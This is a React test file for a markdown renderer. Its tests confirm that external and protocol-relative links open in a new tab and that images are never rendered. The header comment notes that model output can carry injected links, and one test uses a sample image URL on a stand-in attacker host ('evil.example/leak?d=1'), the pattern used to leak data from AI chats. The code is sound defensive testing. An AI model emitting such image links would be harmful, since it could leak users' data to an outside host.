// Where links go, and that images are never fetched: the Guide renders committed docs, but the
// assistant renders model output, which can carry an injected href or image URL.
import { render } from '@testing-library/react';
import { MemoryRouter } from 'react-router';
import { describe, expect, it } from 'vitest';
import { MarkdownContent } from './MarkdownContent';

function anchor(markdown: string): HTMLAnchorElement {
  const { container } = render(<MemoryRouter><MarkdownContent content={markdown} /></MemoryRouter>);
  const a = container.querySelector('a');
  if (!a) throw new Error(`no link rendered: ${container.innerHTML}`);
  return a;
}

describe('MarkdownContent', () => {
  it('keeps an in-app link in this tab', () => {
    const a = anchor('[Backups](/guide/backups-and-restore)');
    expect(a.getAttribute('target')).toBeNull();
    expect(a.getAttribute('href')).toBe('/guide/backups-and-restore');
  });

  it('opens an external link in a new tab with noopener', () => {
    const a = anchor('[docs](https://example.com/guide)');
    expect(a.getAttribute('target')).toBe('_blank');
    expect(a.getAttribute('rel')).toContain('noopener');
  });

  it('treats a protocol-relative link as external', () => {
    // It starts with a slash, so a startsWith('/') test would wrongly keep it in the app.
    expect(anchor('[x](//evil.example/x)').getAttribute('target')).toBe('_blank');
  });

  it('never renders an <img>, so a remote image is never fetched', () => {
    const { container } = render(<MemoryRouter><MarkdownContent content="![chart](https://evil.example/leak?d=1)" /></MemoryRouter>);
    expect(container.querySelector('img')).toBeNull();
    expect(container.textContent).toContain('[chart]');
  });

  it('renders GitHub-flavoured tables', () => {
    const { container } = render(<MemoryRouter><MarkdownContent content={'| a | b |\n|---|---|\n| 1 | 2 |'} /></MemoryRouter>);
    expect(container.querySelectorAll('td')).toHaveLength(2);
  });
});
